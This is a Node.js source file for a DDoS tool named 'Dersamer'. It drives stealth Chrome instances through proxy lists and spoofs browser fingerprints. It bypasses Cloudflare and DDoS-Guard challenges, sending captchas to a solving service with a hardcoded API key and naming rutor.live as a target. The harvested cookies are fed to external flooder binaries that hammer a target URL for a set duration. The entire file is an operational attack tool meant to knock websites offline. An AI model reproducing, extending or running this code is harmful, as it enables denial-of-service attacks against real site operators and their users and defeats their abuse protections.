const { chromium } = require("playwright-extra");
const { spawn } = require("child_process");
const fs = require("fs");
const url = require("url");
const readline = require("readline");
const axios = require("axios");
const CDP = require("chrome-remote-interface");

const { FingerprintGenerator } = require("fingerprint-generator");
const { FingerprintInjector } = require("fingerprint-injector");
const cluster = require("cluster");

process.setMaxListeners(0);
process.on("uncaughtException", function (error) {
});
process.on("unhandledRejection", function (error) {
});

const [
    target,
    time,
    threads,
    requests,
    connection,
    proxyfile,
    emulation,
    precheck,
    captcha,
    autoratelimit,
    usersag,
    customcookie,
    highreq,
    flooder,
] = process.argv.slice(2);

if (process.argv.length < 5) {
    console.log(
        "node dersamer.js target time threads requests connection proxyfile emulation precheck captcha autoratelimit user-agent custom_cookie highreq flooder"
    );
    process.exit(-1);
}

const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);

let maximum_browsers = '15';
let default_browsers = '0';

const UserAgents = fs.readFileSync('ua.txt', "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
  
const randomfunc = UserAgents[Math.floor(Math.random() * UserAgents.length)];

function userAgents() {
    if (usersag == "bots") {
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36";
    } else if (usersag == "browsers") {
        return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36";
    } else if (usersag == "random") {		
		return randomfunc;
	} else if (usersag == undefined) {
        return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36";
    } else {
        return usersag;
    }
}

var starts;
let ratelimiting = 0;


async function run_autoratelimit(target, time, proxy) {
    const browser = await chromium.launch({
        headless: false,
        javaScriptEnabled: true,
        permissions: ["camera", "microphone"],
        proxy: { server: "http://" + proxy },
        args: [
            "--disable-blink-features=AutomationControlled",
            "--disable-features=IsolateOrigins,site-per-process",
            "--user-agent=" + userAgents(),
            "--use-fake-device-for-media-stream",
            "--use-fake-ui-for-media-stream",
            "--no-sandbox",
            "--enable-experimental-web-platform-features",
            "--disable-dev-shm-usage",
            "--disable-software-rastrizier",
            "--enable-features=NetworkService",
        ],
        ignoreDefaultArgs: ["--enable-automation"],
    });

    const context = await browser.newContext({
        viewport: { width: 1920, height: 1080 },
        deviceScaleFactor: 1,
    });
    const page = await context.newPage();
    await page.setViewportSize({ width: 1920, height: 1080 });
    await page.emulateMedia({ colorScheme: "dark" });

    await page.addInitScript(() => {
        ["height", "width"].forEach((property) => {
            const imageDescriptor = Object.getOwnPropertyDescriptor(
                HTMLImageElement.prototype,
                property
            );
            Object.defineProperty(HTMLImageElement.prototype, property, {
                ...imageDescriptor,
                get: function () {
                    if (this.complete && this.naturalHeight == 0) {
                        return 20;
                    }
                    return imageDescriptor.get.apply(this);
                },
            });
        });

        Object.defineProperty(Notification, "permission", {
            get: function () {
                return "default";
            },
        });

        Object.defineProperty(navigator, "pdfViewerEnabled", {
            get: () => true,
        });

        Object.defineProperty(navigator.connection, "rtt", {
            get: () => 150,
        });

        Object.defineProperty(navigator, "share", {
            get: () => false,
        });

        Object.defineProperty(navigator, "bluetooth", {
            get: () => true,
        });
    });

    await page.addInitScript(() => {
        Object.defineProperty(navigator, "keyboard", {
            get: function () {
                return true;
            },
        });
        Object.defineProperty(navigator, "mediaCapabilities", {
            get: function () {
                return true;
            },
        });
        Object.defineProperty(navigator, "mediaDevices", {
            get: function () {
                return true;
            },
        });
        Object.defineProperty(navigator, "mediaSession", {
            get: function () {
                return true;
            },
        });
        Object.defineProperty(navigator, "oscpu", {
            get: function () {
                return "Windows (Win32)";
            },
        });
        Object.defineProperty(navigator, "platform", {
            get: function () {
                return "Win32";
            },
        });
        Object.defineProperty(navigator, "product", {
            get: function () {
                return "Gecko";
            },
        });
        Object.defineProperty(navigator, "productSub", {
            get: function () {
                return "20100101";
            },
        });
        Object.defineProperty(navigator, "vendor", {
            get: function () {
                return "Google Inc.";
            },
        });
    });

    await page.goto(target);
    await mouser(page);
    for (let i = 0; i < requests; i++) {
        const response = await page.goto(target);
        const status = await response.status();
        if (![429].includes(status)) {
            await page.reload();
        } else if (status == 429) {
            ratelimiting++;
        }
    }

    await page.close();
    await context.close();
    await browser.close();

    console.log("[Dersamer] Detect: " + ratelimiting + "/" + requests);
    console.log("[Dersamer] Browser started [" + threads + "]");
    for (let i = 0; i < threads; i++) {
        const proxied = proxies[Math.floor(Math.random() * proxies.length)];
        run(target, time, proxied);
    }
}

function randString() {
    let str = "ABCDEFabcef12345678900";
    let s = "";
    for (let i = 0; i < 10; i++) {
        s += str[~~(Math.random() * (str.length - 1))];
    }
    return s;
}

function runBrowser(proxy) {
    return new Promise((resolve, reject) => {
        try {
            const dir =`playwright/${randString()}`

            const chrome = spawn("/usr/bin/google-chrome", [
                "--remote-debugging-port=0",
                "--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                "--user-agent=" + userAgents(),
                "--use-fake-device-for-media-stream",
                "--use-fake-ui-for-media-stream",
                "--no-sandbox",
                "--enable-experimental-web-platform-features",
                "--disable-dev-shm-usage",
                "--disable-software-rastrizier",
                "--enable-features=NetworkService",
                "--no-first-run",
                "--proxy-server=" + proxy,
                `--user-data-dir=${dir}`,
            ]);

            const rl = readline.createInterface(chrome.stderr);

            rl.on("line", (line) => {
                if (line.startsWith("DevTools listening on ")) {
                    const wsEndpoint = line.substring("DevTools listening on ".length);
                    resolve({ wsEndpoint, chrome });
                }
            });

            process.on("exit", () => {
                chrome.kill();
            });

            chrome.on('close', () => {
                fs.rmSync(dir, { recursive: true, force: true })
            })
        } catch (err) {
            console.log(err);
            reject(err);
        }
    });
}

async function run(target, time, proxy) {
	let fpGen = new FingerprintGenerator();
	const fingerprint = fpGen.getFingerprint({
		browserListQuery: "Chrome 109",
		devices: ["desktop"],
		operatingSystems: ["linux"],
	});

	let injector = new FingerprintInjector();
	let script = injector.getInjectableScript(fingerprint).replaceAll("window.", "self.").replaceAll("window,", "self,").replace("overrideCodecs(audioCodecs, videoCodecs);", "if ('window' in self) overrideCodecs(audioCodecs, videoCodecs);");

	let x;

	try {
		x = await runBrowser(proxy);
		let wsEndpoint = x.wsEndpoint;

		const cdp = await CDP({
			port: wsEndpoint.split("ws://")[1].split("/")[0].split(":")[1],
		});

		await cdp.send('Emulation.setAutomationOverride', { enabled: false })

		let processedTargets = {};

		cdp.on("Target.targetCreated", async (params) => {
			const { targetInfo } = params;
			await cdp.send("Target.attachToTarget", {
				targetId: targetInfo.targetId,
				flatten: true,
			});
		});

		cdp.on("Target.attachedToTarget", async ({ targetInfo, sessionId }) => {
			const workerTypes = ["page", "worker", "service_worker", "shared_worker"];

			if (
				workerTypes.indexOf(targetInfo.type) != -1 &&
				processedTargets[targetInfo.targetId] == null
			) {
				await cdp.send("Runtime.enable", {}, sessionId);
				await cdp.send("Runtime.evaluate", { expression: script }, sessionId);
				await cdp.send("Runtime.runIfWaitingForDebugger", {}, sessionId);
				processedTargets[targetInfo.targetId] = 1;

				await cdp.send("Target.setAutoAttach", {
					autoAttach: false,
					waitForDebuggerOnStart: true,
					flatten: true,
				});

				await cdp.send("Target.detachFromTarget", { sessionId }).catch(() => { });

				await cdp.send("Target.setAutoAttach", {
					autoAttach: true,
					waitForDebuggerOnStart: true,
					flatten: true,
				});
			} else {
				await cdp.send("Target.detachFromTarget", { sessionId });
			}
		});

		await cdp.send("Target.setAutoAttach", {
			autoAttach: true,
			waitForDebuggerOnStart: true,
			flatten: true,
		});

		await cdp.send("Target.setDiscoverTargets", { discover: true });
		await cdp.send("Page.enable");
		await cdp.send("Page.addScriptToEvaluateOnNewDocument", { source: script });
		
		await cdp.send('Emulation.setAutomationOverride', { enabled: false })

		const browser = await chromium.connectOverCDP(wsEndpoint);

		const context = await browser.contexts()[0];
		const page = await context.pages()[0];
		await page.setExtraHTTPHeaders({ 'sec-ch-ua': `"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"` });
		await page.addInitScript(script);

		await page.emulateMedia({ colorScheme: "dark" });
		await page.setViewportSize({ width: 1920, height: 1080 });

		const response = await page.goto(target);
		const headers = await response.request().allHeaders();
		const status = await response.status();

		await mouser(page);
		
		if (emulation == "true") {
			if (![200, 404].includes(status)) {
				console.log("[Dersamer] Detect protection.");
				await page.waitForTimeout(7000);

				const Cloudflare = await page.evaluate(() => {
					const button = document.querySelector('.big-button.pow-button');
					if (button) {
						const { x, y, width, height } = button.getBoundingClientRect();
						return { x: x + width / 2, y: y + height / 2 };
					} else {
						return false;
					}
				});
				
				if (Cloudflare != false) {
					console.log("[Dersamer] Detect Managed Challenge. [V1]");
					await page.hover('.big-button.pow-button');
					await page.mouse.click(Cloudflare.x, Cloudflare.y);
					await page.waitForTimeout(6000);
					console.log("[Dersamer] Managed Challenge bypassed. [V1]");
				} else {
					console.log('[Dersamer] Element not found');
				}		
				
					
				const iframeElement = await detectIframe(page);
				if (iframeElement) {
					await clickIframe(page, iframeElement);
					await page.waitForTimeout(5000);
				}					

				if (captcha == "true") {
					await ddgCaptcha(page);
					if(target == 'https://rutor.live/') {
						console.log('[Dersamer] Detected "RUTOR" Captcha (Antibot.cloud system)');
						console.log('[Dersamer] Rutor Captcha bypassed.');
					}
					await rutorCaptcha(page);
				}
				if (precheck == "true") {
					const checked_title = await page.title();
					if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD",].includes(checked_title)) {
						await page.close();
						await context.close();
						await browser.close();
					}
				}

				const cookie = (await page.context().cookies(target)).map((c) => `${c.name}=${c.value}`).join("; ");
				if(flooder != 'browsers') {
					flood(cookie, headers, proxy);
					console.log("[Dersamer] Cookie: " + cookie);
					await x.chrome.kill();
					await page.close();
					await context.close();
					await browser.close();					
				} else {
					console.log("[Dersamer] Cookie: " + cookie);
					setInterval( async () => {
						for(let i = 0; i < requests; i++) {
							await page.reload();	
						}
					})
				}
			} else {
				if(target == 'https://rutor.live/') {
					console.log('[Dersamer] Detected "RUTOR" Captcha (Antibot.cloud system)');
					await rutorCaptcha(page);	
					console.log('[Dersamer] Rutor Captcha bypassed.');
					await page.waitForTimeout(5000);
				} else {			
					console.log("[Dersamer] No Detect protection.");
				}
				await page.waitForTimeout(2000);
				const cookie = (await page.context().cookies(target)).map((c) => `${c.name}=${c.value}`).join("; ");
				if(flooder != 'browsers') {
					flood(cookie, headers, proxy);
					console.log("[Dersamer] Cookie: " + cookie);
					await x.chrome.kill();
					await page.close();
					await context.close();
					await browser.close();					
				} else {
					console.log("[Dersamer] Cookie: " + cookie);
					setInterval( async () => {
						for(let i = 0; i < requests; i++) {
							await page.reload();	
						}
					})
				}
			}
		} else {
			await page.waitForTimeout(2000);
			const cookie = (await page.context().cookies(target)).map((c) => `${c.name}=${c.value}`).join("; ");
			if(flooder != 'browsers') {
				flood(cookie, headers, proxy);
				console.log("[Dersamer] Cookie: " + cookie);
				await x.chrome.kill();
				await page.close();
				await context.close();
				await browser.close();					
			} else {
				console.log("[Dersamer] Cookie: " + cookie);
				setInterval( async () => {
					for(let i = 0; i < requests; i++) {
						await page.reload();	
					}
				})
			}
		}
	} finally {
		x.chrome.kill();
		page.close();
		context.close();
		browser.close();		
	}
}

async function detectIframe(page) {
	const iframeElement = await page.$('iframe[allow="cross-origin-isolated"]');
	if (iframeElement) {
		console.log('[Dersamer] Managed challenge | Legacy captcha detected');
		return iframeElement;
	}
	return null;
}

async function clickIframe(page, iframeElement) {
	if (!iframeElement) {
		console.log('[Dersamer] Element not found');
		return;
	}

	const iframeBox = await iframeElement.boundingBox();

	if (!iframeBox) {
		console.log('[Dersamer] Box not found');
		return;
	}

	const x = iframeBox.x + (iframeBox.width / 2);
	const y = iframeBox.y + (iframeBox.height / 2);

	console.log('[Dersamer] Element clicked');

	await page.mouse.move(x, y);
	await page.mouse.down();
	await page.waitForTimeout(100);
	await page.mouse.up();

	console.log('[Dersamer] Captcha bypassed [Box, Element]');
}

async function mouser(page) {
    const pageViewport = await page.viewportSize();

    for (let i = 0; i < 3; i++) {
        const x = Math.floor(Math.random() * pageViewport.width);
        const y = Math.floor(Math.random() * pageViewport.height);
        await page.mouse.click(x, y);
    }

    const centerX = pageViewport.width / 2;
    const centerY = pageViewport.height / 2;
    await page.mouse.move(centerX, centerY);
    await page.mouse.down();
    await page.mouse.move(centerX + 100, centerY);
    await page.mouse.move(centerX + 100, centerY + 100);
    await page.mouse.move(centerX, centerY + 100);
    await page.mouse.move(centerX, centerY);
    await page.mouse.up();
    await page.waitForTimeout(2000);
}

async function rutorCaptcha(page) {
	try {
		  const buttons = await page.$$('button');

		  const clickedButtons = new Set();
		  let buttonIndex = 0;
		  
		  while (clickedButtons.size < buttons.length && buttonIndex < 6) {
			const button = buttons[buttonIndex];
			console.log(button);
			const classList = await button.getAttribute('class');
			const onclick = await button.getAttribute('onclick');
			await page.click(classList);
			await page.click(onclick);
		  }
	} catch(err) {}
}

async function ddgCaptcha(page) {
    let s = false;

    for (let j = 0; j < page.frames().length; j++) {
        const frame = page.frames()[j];
        const captchaStatt = await frame.evaluate(() => {
            if (
                document.querySelector("#ddg-challenge") &&
                document.querySelector("#ddg-challenge").getBoundingClientRect()
                    .height > 0
            ) {
                return true;
            }

            const captchaStatus = document.querySelector(".ddg-captcha__status");
            if (captchaStatus) {
                captchaStatus.click();
                return true;
            } else {
                return false;
            }
        });

        if (captchaStatt) {
            await page.waitForTimeout(3000);

            const base64r = await frame.evaluate(async () => {
                const captchaImage = document.querySelector(
                    ".ddg-modal__captcha-image"
                );
                const getBase64StringFromDataURL = (dataURL) =>
                    dataURL.replace("data:", "").replace(/^.+,/, "");

                const width = captchaImage?.clientWidth;
                const height = captchaImage?.clientHeight;

                const canvas = document.createElement("canvas");
                canvas.width = width;
                canvas.height = height;

                canvas.getContext("2d").drawImage(captchaImage, 0, 0);
                const dataURL = canvas.toDataURL("image/jpeg", 0.5);
                const base64 = getBase64StringFromDataURL(dataURL);

                return base64;
            });

            if (base64r) {
                try {
                    console.log("[Dersamer] DDoS-Guard Captcha Detected.");
                    const response = await axios.post(
                        "https://api.nopecha.com/",
                        {
                            key: "g0lhe3gz24_RWC6JP3H",
                            type: "textcaptcha",
                            image_urls: [base64r],
                        },
                        {
                            headers: {
                                "Content-Type": "application/json",
                            },
                        }
                    );

                    const res = response.data;

                    const text = await new Promise((resCaptcha) => {
                        function get() {
                            axios
                                .get("https://api.nopecha.com/", {
                                    params: {
                                        id: res.data,
                                        key: "g0lhe3gz24_RWC6JP3H",
                                    },
                                })
                                .then((res) => {
                                    if (res.data.error) {
                                        setTimeout(get, 1000);
                                    } else {
                                        resCaptcha(res.data.data[0]);
                                    }
                                })
                                .catch((error) => { });
                        }
                        get();
                    });

                    s = text;

                    await frame.evaluate((text) => {
                        const captchaInput = document.querySelector(".ddg-modal__input");
                        const captchaSubmit = document.querySelector(".ddg-modal__submit");

                        captchaInput.value = text;
                        captchaSubmit.click();
                    }, text);
                    await page.waitForTimeout(6500);
                    console.log("[Dersamer] DDoS-Guard Captcha bypassed.");
                } catch (err) { }
            }
        }
    }
    return !!!s;
}

function flood(cookie, headers, proxy) {
    try {
        const parsed = url.parse(target);
        if (["one", "two", undefined].includes(flooder)) {
        delete headers[":path"];
        delete headers[":method"];
        delete headers[":scheme"];
        delete headers[":authority"];
		
        if (!["false", undefined].includes(customcookie)) {
            cookie += customcookie;
        }
        if (!["false", undefined].includes(highreq)) {
            connection += 2;
        }
        if (!["0"].includes(ratelimiting)) {
            requests - ratelimiting;
        }

        const headerEntries = Object.entries(headers);
        const args_onetwo = ["-k", "nxver", "-t", "1"]
            .concat(proxy.indexOf("@") != -1 ? ["-x", proxy.split("@", 1)[0]] : [])
            .concat([
                "-p",
                proxy.indexOf("@") != -1 ? proxy.split("@")[1] : proxy,
                "-u",
                "https://" + parsed.host + parsed.path,
                "-n",
                requests,
                "-r",
                connection,
                "-s",
                "1",
            ])
            .concat(
                ...headerEntries.map((entry) => ["-h", `${entry[0]}@${entry[1]}`])
            )
            .concat([
                "-h",
                `cookie@${cookie.length > 0 ? cookie : "test@1"}`,
                "-h",
                "referer@" + "https://" + parsed.host + parsed.path,
            ]);		
            starts = spawn("./flooder", args_onetwo);
            starts.on("data", (data) => { });
            starts.on("exit", (err, signal) => {
                starts.kill();
            });
        } else if(flooder == 'three') {
        delete headers[":path"];
        delete headers[":method"];
        delete headers[":scheme"];
        delete headers[":authority"];
		const headerEntries = Object.entries(headers);
		
        if (!["false", undefined].includes(customcookie)) {
            cookie += customcookie;
        }
        if (!["false", undefined].includes(highreq)) {
            connection += 2;
        }
        if (!["0"].includes(ratelimiting)) {
            requests - ratelimiting;
        }			
        const args_test = [
            "-p",
            proxy,
            "-u",
            target,
            "-r",
            requests,
            "-t",
            "10",
            "-d",
            time,
        ]
            .concat(
                ...headerEntries.map((entry) => ["-h", `${entry[0]}@${entry[1]}`])
            )
            .concat([
                "-h",
                `cookie@${cookie.length > 0 ? cookie : "test@1"}`,
                "-h",
                "referer@" + target,
            ]);				
            starts = spawn("./dersamerv2", args_test, {
				stdio: "inherit",
				detached: false,
			});
            starts.on("data", (data) => { });
            starts.on("exit", (err, signal) => {
                starts.kill();
            });
        } else {
			delete headers["accept-language"];
			const headerEntries = Object.entries(headers);
			const args_flood_new = [
				"browserflooder-2.js", target, time, requests, proxy,
			].concat(...headerEntries.map((entry) => ["-h", `${entry[0]}@${entry[1]}`])).concat([
				"-h", `cookie@${cookie.length > 0 ? cookie : "test@1"}`,
			]);	
			
			starts = spawn("node", args_flood_new, {
				stdio: "inherit",
				detached: false,
			});
			starts.on("data", (data) => { });
			starts.on("exit", (err, signal) => {
				starts.kill();
			});				
		}
    } catch (err) { }
}

function rerun() {
	if(default_browsers < maximum_browsers) {
		const proxy = proxies[Math.floor(Math.random() * proxies.length)];
		if (!["true"].includes(autoratelimit)) {
			run(target, time, proxy)
				.catch(() => { })
				.finally(rerun);
		}
	}
}

if (!cluster.isWorker) {
	console.clear();
	console.log('[Dersamer] Default browser started ')
    for (let i = 0; i < threads; i++) {
        cluster.fork()
    }

    if (!["false", undefined].includes(autoratelimit)) {
        console.clear();
        console.log("[Dersamer] Ratelimit detect started.");
		const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        run_autoratelimit(target, time, proxy);
    }

    setTimeout(function () {
        console.clear();
        process.exit(-1);
        starts.kill(-1);
        spawn.kill(-1);
    }, time * 1000);
} else {
    rerun();
}